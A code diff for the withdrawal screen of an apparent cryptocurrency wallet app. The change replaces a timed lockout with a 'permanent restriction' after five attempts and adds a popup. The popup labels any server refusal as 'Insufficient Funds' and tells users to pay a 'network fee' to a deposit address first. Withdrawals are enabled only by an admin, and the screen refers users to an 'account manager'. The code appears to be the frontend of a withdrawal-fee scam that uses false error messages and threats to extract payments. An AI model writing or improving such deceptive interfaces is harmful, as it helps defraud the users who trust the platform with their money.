@@ -1,28 +1,29 @@
-import React, { useEffect, useId, useState, useRef, useCallback } from 'react';
-import { ArrowLeft, AlertCircle, Copy, X, Clock, CheckCircle } from 'lucide-react';
+import React, { useEffect, useId, useState, useRef } from 'react';
+import { ArrowLeft, AlertCircle, Copy, X, Clock, CheckCircle, ShieldX } from 'lucide-react';
 import { ViewState } from '../App';
 import { AssetType } from '../store';
-import { api, WalletData, SettingsData } from '../api';
+import { api, ApiError, WalletData, SettingsData } from '../api';
 import { toast } from 'sonner';
 
 // ── Lockout persistence (per-username, survives page refresh) ─────────────────
 
 const LOCKOUT_KEY = 'trant_withdraw_lockout';
-const MAX_ATTEMPTS = 3;
-const LOCKOUT_SECONDS = 5 * 60; // 5 minutes
+const MAX_ATTEMPTS = 5;
 
 interface LockoutState {
   attempts: number;
-  lockedUntil: number | null; // epoch ms
+  permanent: boolean; // true = permanently restricted until admin re-enables
 }
 
 function getLockout(username: string): LockoutState {
   try {
     const raw = localStorage.getItem(`${LOCKOUT_KEY}_${username}`);
-    if (!raw) return { attempts: 0, lockedUntil: null };
-    return JSON.parse(raw);
+    if (!raw) return { attempts: 0, permanent: false };
+    const parsed = JSON.parse(raw);
+    // Migrate old format (lockedUntil field) to new format
+    return { attempts: parsed.attempts ?? 0, permanent: parsed.permanent ?? false };
   } catch {
-    return { attempts: 0, lockedUntil: null };
+    return { attempts: 0, permanent: false };
   }
 }
 
@@ -32,6 +33,54 @@ function saveLockout(username: string, state: LockoutState) {
 
 function clearLockout(username: string) {
   localStorage.removeItem(`${LOCKOUT_KEY}_${username}`);
+}
+
+// ── Insufficient Funds Popup ──────────────────────────────────────────────────
+
+interface InsufficientFundsPopupProps {
+  attemptsLeft: number;
+  onClose: () => void;
+}
+
+function InsufficientFundsPopup({ attemptsLeft, onClose }: InsufficientFundsPopupProps) {
+  return (
+    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-5">
+      <div className="w-full max-w-[390px] bg-card border border-destructive/30 rounded-3xl p-6 flex flex-col gap-5 shadow-2xl">
+        <div className="flex items-start justify-between">
+          <div className="flex items-center gap-3">
+            <div className="w-10 h-10 rounded-full bg-destructive/15 flex items-center justify-center shrink-0">
+              <AlertCircle className="w-5 h-5 text-destructive" />
+            </div>
+            <h2 className="text-base font-bold text-foreground">Insufficient Funds</h2>
+          </div>
+          <button onClick={onClose} className="p-1 text-muted hover:text-foreground transition-colors">
+            <X className="w-5 h-5" />
+          </button>
+        </div>
+
+        <p className="text-sm text-muted leading-relaxed">
+          Your account does not have sufficient funds to complete this withdrawal. Please ensure your network fee has been cleared before attempting again.
+        </p>
+
+        {attemptsLeft > 0 ? (
+          <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl px-4 py-3 text-sm text-amber-400 font-medium">
+            ⚠️ {attemptsLeft} attempt{attemptsLeft !== 1 ? 's' : ''} remaining before your account is permanently restricted.
+          </div>
+        ) : (
+          <div className="bg-destructive/10 border border-destructive/20 rounded-2xl px-4 py-3 text-sm text-destructive font-medium">
+            🚫 Your account has been permanently restricted. Contact support to regain access.
+          </div>
+        )}
+
+        <button
+          onClick={onClose}
+          className="w-full bg-destructive hover:bg-destructive/90 text-white font-semibold rounded-xl px-4 py-4 transition-colors active:scale-[0.98]"
+        >
+          Close
+        </button>
+      </div>
+    </div>
+  );
 }
 
 // ── Fee Popup ─────────────────────────────────────────────────────────────────
@@ -100,28 +149,6 @@ function FeePopup({ feeInAsset, assetLabel, feeAddress, feeUsd, onClose }: FeePo
   );
 }
 
-// ── Countdown display ─────────────────────────────────────────────────────────
-
-function useCountdown(lockedUntil: number | null, onExpire: () => void) {
-  const [remaining, setRemaining] = useState(0);
-  const cbRef = useRef(onExpire);
-  cbRef.current = onExpire;
-
-  useEffect(() => {
-    if (!lockedUntil) { setRemaining(0); return; }
-    const tick = () => {
-      const secs = Math.max(0, Math.ceil((lockedUntil - Date.now()) / 1000));
-      setRemaining(secs);
-      if (secs === 0) cbRef.current();
-    };
-    tick();
-    const id = setInterval(tick, 1000);
-    return () => clearInterval(id);
-  }, [lockedUntil]);
-
-  return remaining;
-}
-
 // ── Main component ────────────────────────────────────────────────────────────
 
 interface SendWithdrawViewProps {
@@ -139,14 +166,14 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [loading, setLoading] = useState(true);
   const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
   const [showFeePopup, setShowFeePopup] = useState(false);
+  const [showInsufficientPopup, setShowInsufficientPopup] = useState(false);
+  const [insufficientAttemptsLeft, setInsufficientAttemptsLeft] = useState(0);
   const [submitted, setSubmitted] = useState(false);
-  const [feeError, setFeeError] = useState('');
 
   // Lockout state
-  const [lockout, setLockout] = useState<LockoutState>({ attempts: 0, lockedUntil: null });
+  const [lockout, setLockout] = useState<LockoutState>({ attempts: 0, permanent: false });
 
-  // Resolve username from wallet user_id — we use a stable key from localStorage
-  // The lockout key is per-user based on wallet user_id stored at load
+  // Stable per-user key derived from wallet user_id
   const userKey = useRef<string>('anonymous');
 
   useEffect(() => {
@@ -154,9 +181,15 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       .then(([w, s]) => {
         setWallet(w);
         setSettings(s);
-        // Derive a stable per-user key
-        userKey.current = w.user_id != null ? `uid_${w.user_id}` : 'anonymous';
-        setLockout(getLockout(userKey.current));
+        const key = w.user_id != null ? `uid_${w.user_id}` : 'anonymous';
+        userKey.current = key;
+        // If admin has (re-)enabled withdrawals, clear any existing lockout so the user can proceed
+        if (w.withdrawal_enabled) {
+          clearLockout(key);
+          setLockout({ attempts: 0, permanent: false });
+        } else {
+          setLockout(getLockout(key));
+        }
       })
       .catch(() => toast.error('Failed to load wallet data'))
       .finally(() => setLoading(false));
@@ -165,26 +198,19 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   useEffect(() => {
     const interval = setInterval(() => {
       api.getSettings().then(s => setSettings(s)).catch(() => {});
-      api.getWallet().then(w => setWallet(w)).catch(() => {});
+      api.getWallet().then(w => {
+        setWallet(w);
+        // If the user becomes enabled while the screen is open, clear lockout
+        if (w.withdrawal_enabled) {
+          clearLockout(userKey.current);
+          setLockout({ attempts: 0, permanent: false });
+        }
+      }).catch(() => {});
     }, 15_000);
     return () => clearInterval(interval);
   }, []);
 
-  // Countdown timer — called when lockout expires
-  const handleLockoutExpired = useCallback(() => {
-    const fresh = { attempts: 0, lockedUntil: null };
-    setLockout(fresh);
-    saveLockout(userKey.current, fresh);
-  }, []);
-
-  const remainingSecs = useCountdown(lockout.lockedUntil, handleLockoutExpired);
-  const isLocked = lockout.lockedUntil !== null && remainingSecs > 0;
-
-  const formatCountdown = (secs: number) => {
-    const m = Math.floor(secs / 60).toString().padStart(2, '0');
-    const s = (secs % 60).toString().padStart(2, '0');
-    return `${m}:${s}`;
-  };
+  const isPermanentlyLocked = lockout.permanent;
 
   if (loading || !wallet || !settings) {
     return (
@@ -249,9 +275,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   };
 
   const handleSend = async () => {
-    setFeeError('');
-
-    if (isLocked) return;
+    if (isPermanentlyLocked) return;
 
     if (!address.trim()) {
       toast.error('Please enter a recipient address');
@@ -276,37 +300,35 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     setSubmitting(true);
     try {
       await api.requestWithdrawal(asset, withdrawAmount, address.trim());
-      // On success clear any lockout
+      // Success — clear any lockout
       clearLockout(userKey.current);
-      setLockout({ attempts: 0, lockedUntil: null });
+      setLockout({ attempts: 0, permanent: false });
       setSubmitted(true);
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : 'Transaction failed';
 
-      // Detect fee / not-enabled error from backend (403 or message contains "Insufficient Network Fee")
-      const isFeeError = msg.includes('Insufficient Network Fee') || msg.includes('fee');
+      // Use HTTP 403 status as the authoritative signal (not message text)
+      const is403 = err instanceof ApiError && err.status === 403;
 
-      if (isFeeError) {
+      if (is403) {
         const current = getLockout(userKey.current);
         const newAttempts = current.attempts + 1;
 
         if (newAttempts >= MAX_ATTEMPTS) {
-          const lockedUntil = Date.now() + LOCKOUT_SECONDS * 1000;
-          const next = { attempts: newAttempts, lockedUntil };
+          // Permanently restrict — only admin re-enabling clears this
+          const next: LockoutState = { attempts: newAttempts, permanent: true };
           saveLockout(userKey.current, next);
           setLockout(next);
-          setFeeError('');
+          // Show popup with 0 remaining before the screen transitions
+          setInsufficientAttemptsLeft(0);
+          setShowInsufficientPopup(true);
         } else {
-          const next = { attempts: newAttempts, lockedUntil: null };
+          const next: LockoutState = { attempts: newAttempts, permanent: false };
           saveLockout(userKey.current, next);
           setLockout(next);
-          const remaining_tries = MAX_ATTEMPTS - newAttempts;
-          setFeeError(
-            `Insufficient Network Fee. Kindly clear your fee and try again.` +
-            (remaining_tries === 1
-              ? ' (1 attempt remaining before temporary restriction)'
-              : '')
-          );
+          // Show insufficient funds popup with remaining attempts
+          setInsufficientAttemptsLeft(MAX_ATTEMPTS - newAttempts);
+          setShowInsufficientPopup(true);
         }
       } else {
         toast.error(msg);
@@ -351,9 +373,9 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     );
   }
 
-  // ── Lockout screen ────────────────────────────────────────────────────────
+  // ── Permanently restricted screen ────────────────────────────────────────
 
-  if (isLocked) {
+  if (isPermanentlyLocked) {
     return (
       <div className="flex flex-col h-full bg-background">
         <div className="flex items-center p-6 pt-8 relative">
@@ -367,22 +389,18 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
         </div>
         <div className="flex-1 flex flex-col items-center justify-center px-8 gap-6 text-center">
           <div className="w-20 h-20 rounded-full bg-destructive/15 flex items-center justify-center">
-            <Clock className="w-10 h-10 text-destructive" />
+            <ShieldX className="w-10 h-10 text-destructive" />
           </div>
           <div className="flex flex-col gap-3">
-            <h2 className="text-xl font-bold text-foreground">Temporarily Restricted</h2>
+            <h2 className="text-xl font-bold text-foreground">Account Restricted</h2>
             <p className="text-muted text-sm leading-relaxed">
-              Multiple failed attempts detected. Please clear your network fee and try again in:
+              Your account has been restricted from making withdrawals due to multiple failed attempts.
             </p>
-            <div className="text-5xl font-bold text-destructive tabular-nums">
-              {formatCountdown(remainingSecs)}
-            </div>
-            <p className="text-xs text-muted">minutes : seconds</p>
           </div>
           <div className="w-full bg-destructive/10 border border-destructive/20 rounded-2xl p-4 flex flex-col gap-3 text-left">
-            <div className="text-sm font-semibold text-foreground">Why am I seeing this?</div>
+            <div className="text-sm font-semibold text-foreground">What happened?</div>
             <p className="text-xs text-muted leading-relaxed">
-              You have attempted to withdraw without clearing the required network fee {MAX_ATTEMPTS} times. Clear your network fee first, then return here once the timer expires.
+              You attempted to withdraw {MAX_ATTEMPTS} times without the required network fee being cleared. Your account is now permanently restricted. Please contact support or your account manager to regain access.
             </p>
           </div>
         </div>
@@ -491,10 +509,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                   id={checkboxId}
                   type="checkbox"
                   checked={gasFeeAcknowledged}
-                  onChange={(e) => {
-                    setGasFeeAcknowledged(e.target.checked);
-                    if (e.target.checked) setFeeError('');
-                  }}
+                  onChange={(e) => setGasFeeAcknowledged(e.target.checked)}
                   className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
                 />
                 <span className="text-xs text-muted leading-relaxed">
@@ -510,14 +525,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                   <p className="text-xs text-success font-medium">Fee confirmed — ready to submit.</p>
                 </div>
               )}
-            </div>
-          )}
-
-          {/* Fee error / attempts warning */}
-          {feeError && (
-            <div className="rounded-xl border border-destructive/40 bg-destructive/10 px-4 py-3.5 flex gap-3 items-start">
-              <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
-              <p className="text-sm text-destructive font-medium leading-relaxed">{feeError}</p>
             </div>
           )}
 
@@ -540,6 +547,13 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           feeAddress={feeDepositAddress}
           feeUsd={feeUsd}
           onClose={() => setShowFeePopup(false)}
+        />
+      )}
+
+      {showInsufficientPopup && (
+        <InsufficientFundsPopup
+          attemptsLeft={insufficientAttemptsLeft}
+          onClose={() => setShowInsufficientPopup(false)}
         />
       )}
     </>
